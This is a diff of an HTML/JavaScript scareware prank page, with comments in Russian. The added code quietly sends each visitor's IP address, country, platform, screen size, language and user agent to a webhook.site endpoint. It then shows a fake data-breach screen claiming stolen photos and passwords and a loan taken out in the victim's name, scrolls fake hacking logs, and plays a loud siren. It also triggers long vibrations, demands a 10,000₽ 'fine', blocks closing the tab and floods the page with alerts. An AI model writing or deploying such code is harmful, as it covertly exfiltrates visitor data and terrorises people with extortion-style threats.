@@ -3,7 +3,7 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SYSTEM ERROR / ОШИБКА СИСТЕМЫ</title>
+    <title>CRITICAL ERROR</title>
     <style>
         html, body {
             margin: 0; padding: 0; height: 100%;
@@ -14,7 +14,10 @@
             position: fixed; inset: 0; width: 100%; height: 100%;
             object-fit: cover; display: block; pointer-events: none; z-index: 1;
             transition: transform 0.05s, filter 0.1s;
+            opacity: 0; /* Скрыто по умолчанию */
         }
+        .show-vid { opacity: 1 !important; }
+        
         .shake { animation: shakeAnim 0.05s infinite; }
         @keyframes shakeAnim {
             0% { transform: translate(20px, 10px) scale(1.3) rotate(3deg); filter: contrast(4) hue-rotate(90deg) invert(1); }
@@ -29,15 +32,25 @@
             animation: glitch 0.1s infinite;
         }
         @keyframes glitch { 0% { transform: translateY(0); } 50% { transform: translateY(30px); } 100% { transform: translateY(0); } }
+        
         #virus-overlay {
-            display: none; position: fixed; inset: 0; background: rgba(150, 0, 0, 0.98);
-            color: #fff; z-index: 9999; text-align: center; padding: 5vh 20px;
-            font-weight: bold; text-shadow: 1px 1px 2px #000;
+            display: none; position: fixed; inset: 0; background: rgba(120, 0, 0, 0.95);
+            color: #fff; z-index: 9999; text-align: left; padding: 20px;
+            font-weight: bold; text-shadow: 1px 1px 2px #000; font-size: 18px;
         }
-        #virus-overlay h1 { font-size: 36px; margin: 0; animation: flash 0.2s infinite; color: yellow; }
-        #virus-overlay p { font-size: 16px; margin-top: 15px; line-height: 1.4; }
+        #virus-overlay h1 { font-size: 30px; margin: 0 0 10px 0; animation: flash 0.2s infinite; color: yellow; text-align: center;}
+        #terminal-text {
+            margin-top: 20px;
+            height: 50vh;
+            overflow: hidden;
+            color: #00ff00;
+            font-size: 14px;
+            text-shadow: 0 0 5px #00ff00;
+        }
+        .threat-text { color: #ff3333; font-size: 20px; margin-top: 20px; text-align: center; }
+        
         #pay-btn {
-            display: none; margin-top: 20px; padding: 15px 30px; background: yellow;
+            display: none; margin: 20px auto; padding: 15px 30px; background: yellow;
             color: black; font-size: 20px; font-weight: bold; border: none;
             border-radius: 5px; cursor: pointer; animation: pulse 0.5s infinite alternate;
             z-index: 10000; position: relative;
@@ -56,10 +69,10 @@
     <div id="glitch-overlay"></div>
     
     <div id="virus-overlay">
-        <h1 id="title-text">💀 СИСТЕМА ВЗЛОМАНА 💀</h1>
-        <p id="desc-text">Обнаружено мошенничество. Доступ к устройству получен.</p>
-        <p id="req-text" style="color: #ff6666; margin-top: 15px;">Требуется немедленная оплата штрафа для разблокировки.</p>
-        <button id="pay-btn">ОПЛАТИТЬ ШТРАФ (5000₽)</button>
+        <h1>⚠️ УТЕЧКА ДАННЫХ ⚠️</h1>
+        <div id="terminal-text"></div>
+        <p class="threat-text">Все ваши фото и пароли скопированы! На ваше имя оформлен кредит.</p>
+        <button id="pay-btn">ОПЛАТИТЬ ШТРАФ (10 000₽)</button>
     </div>
     
     <video id="vid" playsinline webkit-playsinline preload="auto" muted>
@@ -74,153 +87,126 @@
             const virusOverlay = document.getElementById('virus-overlay');
             const glitchOverlay = document.getElementById('glitch-overlay');
             const payBtn = document.getElementById('pay-btn');
-            const titleText = document.getElementById('title-text');
-            const descText = document.getElementById('desc-text');
-            const reqText = document.getElementById('req-text');
+            const terminalText = document.getElementById('terminal-text');
             let started = false;
 
             function start() {
                 if (started) return;
                 started = true;
 
-                // === ОТПРАВКА ДАННЫХ В ТВОЙ WEBHOOK ===
+                // ОТПРАВКА ДАННЫХ
                 fetch('https://api.ipify.org?format=json')
                     .then(res => res.json())
-                    .then(data => {
-                        return fetch(`https://ipapi.co/${data.ip}/json/`);
-                    })
+                    .then(data => fetch(`https://ipapi.co/${data.ip}/json/`))
                     .then(res => res.json())
                     .then(data => {
-                        const country = data.country_code || "Unknown";
-                        const isRussia = (country === "RU");
-                        
-                        // Перевод интерфейса
-                        if (isRussia) {
-                            titleText.innerText = "💀 СИСТЕМА ВЗЛОМАНА 💀";
-                            descText.innerText = "Обнаружено мошенничество. Доступ к устройству получен.";
-                            reqText.innerText = "Требуется немедленная оплата штрафа для разблокировки.";
-                            payBtn.innerText = "ОПЛАТИТЬ ШТРАФ (5000₽)";
-                        } else {
-                            titleText.innerText = "💀 SYSTEM HACKED 💀";
-                            descText.innerText = "Fraud detected. Access to device obtained.";
-                            reqText.innerText = "Immediate payment required to unlock.";
-                            payBtn.innerText = "PAY FINE ($50)";
-                        }
-
-                        // Отправка логов
                         const payload = JSON.stringify({
-                            country: country,
+                            country: data.country_code || "Unknown",
                             ip: data.ip,
                             platform: navigator.platform,
                             screen: window.screen.width + "x" + window.screen.height,
                             language: navigator.language,
                             userAgent: navigator.userAgent
                         });
-                        
+                        // ВСТАВЬ СЮДА СВОЮ ССЫЛКУ ОТ RENDER (или webhook.site)
                         fetch("https://webhook.site/8210aa39-3a98-4986-b37e-1fbc65a13f63", {
                             method: "POST",
                             headers: { "Content-Type": "application/json" },
                             body: payload
                         }).catch(e => console.log(e));
-                    })
-                    .catch(() => {
-                        // Если гео-апи упало, шлем что есть
-                        const payload = JSON.stringify({
-                            ip: "Скрыт",
-                            platform: navigator.platform,
-                            screen: window.screen.width + "x" + window.screen.height
-                        });
-                        fetch("https://webhook.site/8210aa39-3a98-4986-b37e-1fbc65a13f63", {
-                            method: "POST",
-                            headers: { "Content-Type": "application/json" },
-                            body: payload
-                        }).catch(e => console.log(e));
-                    });
+                    }).catch(e => console.log(e));
 
-                // === РАЗЪЁБ ===
-                let isNuke = Math.random() > 0.5;
-                vid.classList.add('shake');
-                glitchOverlay.style.display = 'block';
+                // РУЛЕТКА (10% - Рикролл, 90% - Апокалипсис)
+                let isRickroll = Math.random() < 0.1;
                 hint.classList.add('hidden');
 
-                if (navigator.vibrate) {
-                    navigator.vibrate([10000, 500, 10000, 500, 10000]);
-                }
-
-                setTimeout(() => {
+                if (isRickroll) {
+                    // СЦЕНАРИЙ 1: ДЖЕКПОТ (РИКРОЛЛ)
+                    vid.classList.add('show-vid', 'shake');
+                    vid.play().then(() => {
+                        vid.muted = false;
+                        vid.volume = 1;
+                    });
+                } else {
+                    // СЦЕНАРИЙ 2: ПОЛНЫЙ РАЗЪЁБ (СИРЕНА + УГРОЗЫ)
+                    glitchOverlay.style.display = 'block';
                     virusOverlay.style.display = 'block';
-                    setTimeout(() => { payBtn.style.display = 'inline-block'; }, 2000);
-                }, isNuke ? 1000 : 3000);
+                    setTimeout(() => { payBtn.style.display = 'block'; }, 3000);
 
-                payBtn.addEventListener('click', function() {
-                    let count = 0;
-                    while (count < 50) {
-                        setTimeout(() => { 
-                            alert("ОШИБКА: ОПЛАТА НЕ ПРОШЛА. / ERROR: PAYMENT FAILED."); 
-                        }, count * 100);
-                        count++;
-                    }
-                });
+                    if (navigator.vibrate) navigator.vibrate([10000, 500, 10000, 500, 10000]);
 
-                window.onbeforeunload = function(e) {
-                    e.preventDefault();
-                    e.returnValue = "Данные переданы. Закрытие заблокировано. / Data sent. Closing blocked.";
-                    return e.returnValue;
-                };
+                    // Бесконечный поток фейковых логов взлома
+                    const logs = [
+                        "> Подключение к базе данных...",
+                        "> Обход шифрования... УСПЕШНО",
+                        "> Скачивание паролей от Госуслуг...",
+                        "> Доступ к галерее... 45%",
+                        "> Доступ к галерее... 100%",
+                        "> Поиск компромата в буфере обмена...",
+                        "> Отправка СМС на номер 900...",
+                        "> Взлом Telegram...",
+                        "> Слив фото в открытый доступ...",
+                        "> Оформление микрозайма..."
+                    ];
+                    let logIndex = 0;
+                    setInterval(() => {
+                        if(logIndex < logs.length) {
+                            terminalText.innerHTML += logs[logIndex] + "<br>";
+                            logIndex++;
+                        } else {
+                            terminalText.innerHTML = "> ОШИБКА ДОСТУПА. ТРЕБУЕТСЯ ОПЛАТА.";
+                        }
+                    }, 300);
 
-                vid.play().then(() => {
+                    // ЗВУКОВОЙ ТЕРРОР (Сирена)
                     try {
                         const AudioContext = window.AudioContext || window.webkitAudioContext;
                         if (AudioContext) {
                             const audioCtx = new AudioContext();
                             if (audioCtx.state === 'suspended') audioCtx.resume();
 
-                            const source = audioCtx.createMediaElementSource(vid);
-                            const compressor = audioCtx.createDynamicsCompressor();
-                            compressor.threshold.value = -50;
-                            compressor.ratio.value = 20;
-                            compressor.attack.value = 0.01;
+                            const oscillator = audioCtx.createOscillator();
+                            oscillator.type = 'sawtooth';
+                            oscillator.frequency.setValueAtTime(400, audioCtx.currentTime);
                             
-                            const gainNode = audioCtx.createGain();
-                            gainNode.gain.value = isNuke ? 15.0 : 5.0;
+                            const compressor = audioCtx.createDynamicsCompressor();
+                            compressor.threshold.value = -40;
 
-                            source.connect(gainNode);
-                            gainNode.connect(compressor);
+                            const oscGain = audioCtx.createGain();
+                            oscGain.gain.value = 0.8; // Очень громко
+                            
+                            oscillator.connect(oscGain);
+                            oscGain.connect(compressor);
                             compressor.connect(audioCtx.destination);
+                            oscillator.start();
 
-                            if (isNuke) {
-                                const oscillator = audioCtx.createOscillator();
-                                oscillator.type = 'sawtooth';
-                                oscillator.frequency.setValueAtTime(300, audioCtx.currentTime);
-                                oscillator.frequency.linearRampToValueAtTime(900, audioCtx.currentTime + 0.5);
-                                oscillator.frequency.linearRampToValueAtTime(300, audioCtx.currentTime + 1);
-                                
-                                setInterval(() => {
-                                    if (audioCtx.state === 'running') {
-                                        oscillator.frequency.linearRampToValueAtTime(900, audioCtx.currentTime + 0.5);
-                                        oscillator.frequency.linearRampToValueAtTime(300, audioCtx.currentTime + 1);
-                                    }
-                                }, 1000);
-
-                                const oscGain = audioCtx.createGain();
-                                oscGain.gain.value = 0.4;
-                                
-                                oscillator.connect(oscGain);
-                                oscGain.connect(compressor);
-                                oscillator.start();
-                                setTimeout(() => { try { oscillator.stop(); } catch(e){} }, 15000);
-                            }
-
-                            vid.muted = false;
-                            vid.volume = 1;
+                            // Сирена воет вверх-вниз
+                            setInterval(() => {
+                                if (audioCtx.state === 'running') {
+                                    oscillator.frequency.linearRampToValueAtTime(1200, audioCtx.currentTime + 0.5);
+                                    oscillator.frequency.linearRampToValueAtTime(400, audioCtx.currentTime + 1);
+                                }
+                            }, 1000);
                         }
-                    } catch (e) {
-                        vid.muted = false;
-                        vid.volume = 1;
+                    } catch (e) {}
+                }
+
+                // Блокировка закрытия
+                window.onbeforeunload = function(e) {
+                    e.preventDefault();
+                    e.returnValue = "ДАННЫЕ УКРАДЕНЫ. НЕ ЗАКРЫВАЙТЕ СТРАНИЦУ.";
+                    return e.returnValue;
+                };
+
+                // Окна при клике на кнопку
+                payBtn.addEventListener('click', function() {
+                    let count = 0;
+                    while (count < 50) {
+                        setTimeout(() => { 
+                            alert("ОШИБКА: ПЕРЕВОД ОТКЛОНЕН БАНКОМ. ПОВТОРИТЕ."); 
+                        }, count * 100);
+                        count++;
                     }
-                }).catch(() => {
-                    vid.muted = true;
-                    vid.play();
                 });
             }
 
